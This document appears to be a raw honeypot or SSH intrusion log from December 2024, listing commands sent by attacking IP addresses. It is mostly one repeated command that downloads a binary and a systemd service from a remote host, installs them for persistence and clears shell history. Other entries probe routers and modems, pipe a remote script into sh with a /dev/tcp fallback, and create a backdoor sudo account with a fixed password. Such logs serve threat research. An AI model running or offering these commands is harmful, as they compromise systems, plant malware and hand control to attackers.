start
2024-12-11 06:34:16.078347 - ('45.148.10.203', 35210) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 06:34:25.759335 - ('45.148.10.203', 51848) - apt
2024-12-11 06:34:27.846962 - ('45.148.10.203', 51848) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 06:34:36.546716 - ('45.148.10.203', 51518) - apt
2024-12-11 06:34:38.322617 - ('45.148.10.203', 51518) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 06:34:46.898336 - ('45.148.10.203', 40204) - apt
2024-12-11 06:34:48.567635 - ('45.148.10.203', 40204) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 06:34:56.779619 - ('45.148.10.203', 47492) - apt
2024-12-11 06:34:58.300287 - ('45.148.10.203', 47492) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 06:35:07.254220 - ('45.148.10.203', 40310) - apt
2024-12-11 06:35:09.045260 - ('45.148.10.203', 40310) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 08:18:20.984831 - ('124.60.190.75', 50880) - /ip cloud print
2024-12-11 08:18:22.048000 - ('124.60.190.75', 50880) - ifconfig
2024-12-11 08:18:22.911034 - ('124.60.190.75', 50880) - uname -a
2024-12-11 08:18:23.771432 - ('124.60.190.75', 50880) - cat /proc/cpuinfo
2024-12-11 08:18:24.635601 - ('124.60.190.75', 50880) - ps | grep '[Mm]iner'
2024-12-11 08:18:25.500041 - ('124.60.190.75', 50880) - ps -ef | grep '[Mm]iner'
2024-12-11 08:18:26.363514 - ('124.60.190.75', 50880) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-11 08:18:27.228268 - ('124.60.190.75', 50880) - echo Hi | cat -n
2024-12-11 09:34:23.146862 - ('45.148.10.203', 60692) - apt
2024-12-11 09:34:24.935792 - ('45.148.10.203', 60692) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 09:34:33.927566 - ('45.148.10.203', 49932) - apt
2024-12-11 09:34:35.799619 - ('45.148.10.203', 49932) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 10:08:26.446776 - ('112.159.231.35', 37934) - /ip cloud print
2024-12-11 10:08:27.510506 - ('112.159.231.35', 37934) - ifconfig
2024-12-11 10:08:28.376401 - ('112.159.231.35', 37934) - uname -a
2024-12-11 10:08:29.246892 - ('112.159.231.35', 37934) - cat /proc/cpuinfo
2024-12-11 10:08:30.110534 - ('112.159.231.35', 37934) - ps | grep '[Mm]iner'
2024-12-11 10:08:30.975365 - ('112.159.231.35', 37934) - ps -ef | grep '[Mm]iner'
2024-12-11 10:08:31.838640 - ('112.159.231.35', 37934) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-11 10:08:32.714740 - ('112.159.231.35', 37934) - echo Hi | cat -n
2024-12-11 10:25:19.582401 - ('122.33.184.206', 54789) - /ip cloud print
2024-12-11 10:25:20.650355 - ('122.33.184.206', 54789) - ifconfig
2024-12-11 10:25:21.522340 - ('122.33.184.206', 54789) - uname -a
2024-12-11 10:25:22.418553 - ('122.33.184.206', 54789) - cat /proc/cpuinfo
2024-12-11 10:25:23.310733 - ('122.33.184.206', 54789) - ps | grep '[Mm]iner'
2024-12-11 10:25:24.170501 - ('122.33.184.206', 54789) - ps -ef | grep '[Mm]iner'
2024-12-11 10:25:25.038663 - ('122.33.184.206', 54789) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-11 10:25:25.902598 - ('122.33.184.206', 54789) - echo Hi | cat -n
2024-12-11 14:02:56.126910 - ('195.178.110.6', 46704) - apt
2024-12-11 14:02:58.559330 - ('195.178.110.6', 46704) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 14:03:09.890684 - ('195.178.110.6', 54270) - apt
2024-12-11 14:03:12.290689 - ('195.178.110.6', 54270) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 14:03:21.936753 - ('195.178.110.6', 47148) - apt
2024-12-11 14:03:23.730474 - ('195.178.110.6', 47148) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 14:03:34.336572 - ('195.178.110.6', 51608) - apt
2024-12-11 14:03:35.962198 - ('195.178.110.6', 51608) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 14:03:48.728158 - ('195.178.110.6', 51180) - apt
2024-12-11 14:03:51.139655 - ('195.178.110.6', 51180) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 14:04:01.945751 - ('195.178.110.6', 57052) - apt
2024-12-11 14:04:04.021217 - ('195.178.110.6', 57052) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 14:04:15.549616 - ('195.178.110.6', 52870) - apt
2024-12-11 14:04:18.418808 - ('195.178.110.6', 52870) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 14:04:28.549027 - ('195.178.110.6', 39986) - apt
2024-12-11 14:04:30.632290 - ('195.178.110.6', 39986) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 14:04:40.619818 - ('195.178.110.6', 51152) - apt
2024-12-11 14:04:42.341550 - ('195.178.110.6', 51152) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 14:04:52.248864 - ('195.178.110.6', 46738) - apt
2024-12-11 14:04:54.117210 - ('195.178.110.6', 46738) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 14:05:04.875035 - ('195.178.110.6', 39492) - apt
2024-12-11 14:05:07.598619 - ('195.178.110.6', 39492) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 14:06:09.021377 - ('195.178.110.6', 54144) - apt
2024-12-11 14:06:11.131743 - ('195.178.110.6', 54144) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 14:06:23.185861 - ('195.178.110.6', 47092) - apt
2024-12-11 14:06:25.197735 - ('195.178.110.6', 47092) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 14:06:38.916719 - ('195.178.110.6', 47038) - apt
2024-12-11 14:06:40.626092 - ('195.178.110.6', 47038) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 14:06:51.535879 - ('195.178.110.6', 36476) - apt
2024-12-11 14:06:53.826439 - ('195.178.110.6', 36476) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 14:07:03.729860 - ('195.178.110.6', 42592) - apt
2024-12-11 14:07:05.607030 - ('195.178.110.6', 42592) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 14:07:17.344953 - ('195.178.110.6', 52410) - apt
2024-12-11 14:07:18.726543 - ('195.178.110.6', 52410) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 14:07:30.502246 - ('195.178.110.6', 59678) - apt
2024-12-11 14:07:32.114410 - ('195.178.110.6', 59678) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 14:07:44.027650 - ('195.178.110.6', 37308) - apt
2024-12-11 14:07:46.525544 - ('195.178.110.6', 37308) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 14:07:58.140932 - ('195.178.110.6', 47410) - apt
2024-12-11 14:07:59.624917 - ('195.178.110.6', 47410) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 14:08:12.320946 - ('195.178.110.6', 46300) - apt
2024-12-11 14:08:13.629395 - ('195.178.110.6', 46300) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 14:08:25.302676 - ('195.178.110.6', 44544) - apt
2024-12-11 14:08:27.268107 - ('195.178.110.6', 44544) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 14:08:39.148596 - ('195.178.110.6', 60972) - apt
2024-12-11 14:08:41.314595 - ('195.178.110.6', 60972) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 14:08:51.738323 - ('195.178.110.6', 53040) - apt
2024-12-11 14:08:54.425322 - ('195.178.110.6', 53040) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 14:09:04.915965 - ('195.178.110.6', 58736) - apt
2024-12-11 14:09:06.935626 - ('195.178.110.6', 58736) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 14:09:18.426412 - ('195.178.110.6', 39640) - apt
2024-12-11 14:09:20.412428 - ('195.178.110.6', 39640) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 14:09:31.841673 - ('195.178.110.6', 38784) - apt
2024-12-11 14:09:33.723277 - ('195.178.110.6', 38784) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 14:09:44.727403 - ('195.178.110.6', 46024) - apt
2024-12-11 14:09:46.897245 - ('195.178.110.6', 46024) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 14:09:57.009029 - ('195.178.110.6', 44394) - apt
2024-12-11 14:09:58.622085 - ('195.178.110.6', 44394) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 14:10:11.417437 - ('195.178.110.6', 57028) - apt
2024-12-11 14:10:13.523544 - ('195.178.110.6', 57028) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 14:10:24.227520 - ('195.178.110.6', 53738) - apt
2024-12-11 14:10:26.610628 - ('195.178.110.6', 53738) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 14:10:37.215901 - ('195.178.110.6', 42258) - apt
2024-12-11 14:10:39.204489 - ('195.178.110.6', 42258) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 14:10:49.218444 - ('195.178.110.6', 44364) - apt
2024-12-11 14:10:50.937232 - ('195.178.110.6', 44364) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 14:11:01.501179 - ('195.178.110.6', 45804) - apt
2024-12-11 14:11:03.021070 - ('195.178.110.6', 45804) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 14:11:14.485982 - ('195.178.110.6', 58416) - apt
2024-12-11 14:11:16.347322 - ('195.178.110.6', 58416) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 14:11:27.827751 - ('195.178.110.6', 33130) - apt
2024-12-11 14:11:30.642315 - ('195.178.110.6', 33130) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 14:11:41.306017 - ('195.178.110.6', 49088) - apt
2024-12-11 14:11:43.710166 - ('195.178.110.6', 49088) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 16:53:45.824915 - ('124.52.246.233', 34497) - /ip cloud print
2024-12-11 16:53:47.499656 - ('124.52.246.233', 34497) - ifconfig
2024-12-11 16:53:48.678271 - ('124.52.246.233', 34497) - uname -a
2024-12-11 16:53:49.903214 - ('124.52.246.233', 34497) - cat /proc/cpuinfo
2024-12-11 16:53:51.069512 - ('124.52.246.233', 34497) - ps | grep '[Mm]iner'
2024-12-11 16:53:52.213124 - ('124.52.246.233', 34497) - ps -ef | grep '[Mm]iner'
2024-12-11 16:53:53.307265 - ('124.52.246.233', 34497) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-11 16:53:54.530551 - ('124.52.246.233', 34497) - echo Hi | cat -n
2024-12-11 20:21:52.517368 - ('87.120.113.231', 52130) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-12-11 20:29:55.184912 - ('222.118.167.160', 44714) - /ip cloud print
2024-12-11 20:29:56.994624 - ('222.118.167.160', 44714) - ifconfig
2024-12-11 20:29:58.427308 - ('222.118.167.160', 44714) - uname -a
2024-12-11 20:29:59.939470 - ('222.118.167.160', 44714) - cat /proc/cpuinfo
2024-12-11 20:30:01.368711 - ('222.118.167.160', 44714) - ps | grep '[Mm]iner'
2024-12-11 20:30:02.795716 - ('222.118.167.160', 44714) - ps -ef | grep '[Mm]iner'
2024-12-11 20:30:04.227395 - ('222.118.167.160', 44714) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-11 20:30:05.663351 - ('222.118.167.160', 44714) - echo Hi | cat -n
2024-12-11 21:41:30.862215 - ('46.19.143.66', 33394) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 ZqMAJYCy) system && sudo usermod -aG sudo system
2024-12-11 21:41:31.403113 - ('46.19.143.66', 33394) - lscpu && echo -e "ZqMAJYCy\nZqMAJYCy" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-12-12 00:53:41.211226 - ('195.178.110.6', 59414) - apt
2024-12-12 00:53:42.407916 - ('195.178.110.6', 59414) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 00:53:49.276755 - ('195.178.110.6', 59428) - apt
2024-12-12 00:53:50.374065 - ('195.178.110.6', 59428) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 00:53:57.237232 - ('195.178.110.6', 52502) - apt
2024-12-12 00:53:58.321053 - ('195.178.110.6', 52502) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 00:54:05.330985 - ('195.178.110.6', 33896) - apt
2024-12-12 00:54:06.425592 - ('195.178.110.6', 33896) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 00:54:13.283224 - ('195.178.110.6', 57694) - apt
2024-12-12 00:54:14.384321 - ('195.178.110.6', 57694) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 00:54:21.751734 - ('195.178.110.6', 52444) - apt
